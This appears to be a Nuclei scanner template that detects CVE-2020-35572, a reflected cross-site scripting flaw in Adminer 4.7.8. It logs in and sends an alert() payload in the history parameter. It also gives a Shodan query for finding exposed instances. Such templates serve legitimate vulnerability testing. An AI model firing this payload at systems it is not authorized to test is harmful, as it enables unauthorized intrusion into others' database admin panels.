id: CVE-2020-35572
info:
  author: Matt Galligan
  classification:
    cve-id: CVE-2020-35572
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-94
  description: 'Adminer through 4.7.8 allows XSS via the history parameter to the
    default URI.

    '
  metadata:
    shodan-query: http.title:adminer
    verified: 'true'
  name: Adminer 4.7.8 - Cross Site Scripting
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2020-35572
  - https://sourceforge.net/p/adminer/bugs-and-features/775/
  severity: medium
  tags: cve,cve2020,adminer,xss
requests:
- cookie-reuse: true
  host-redirects: true
  matchers:
  - condition: and
    part: body_3
    type: word
    words:
    - '&history=''>-alert(''document.domain'')-'''
    - Adminer
  - part: header_3
    type: word
    words:
    - text/html
  - part: status_3
    status:
    - 200
    type: status
  payloads:
    path:
    - /
    - /adminer/
    - /adminer.php
  raw:
  - 'GET {{path}} HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST {{path}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    auth%5Bdriver%5D=server&auth%5Bserver%5D={{servername}}&auth%5Busername%5D={{username}}&auth%5Bpassword%5D={{password}}&auth%5Bdb%5D=

    '
  - 'GET {{path}}?server={{servername}}&username={{username}}&sql=&history=''>-alert(''document.domain'')-''
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
  stop-at-first-match: true
